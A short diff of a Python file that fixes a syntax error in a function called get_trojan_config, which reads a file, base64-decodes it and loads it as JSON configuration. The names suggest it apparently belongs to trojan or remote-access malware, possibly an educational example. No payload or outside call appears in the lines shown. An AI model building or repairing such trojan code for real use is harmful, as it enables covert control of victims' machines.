@@ -55,7 +55,7 @@ def get_file_contents(filepath):
 	return None
 
 def get_trojan_config():
-	global configured = False
+	global configured
 	config_json = get_file_contents(trojan_config)
 	config = json.loads(base64.b64decode(config_json))
 	configured = True
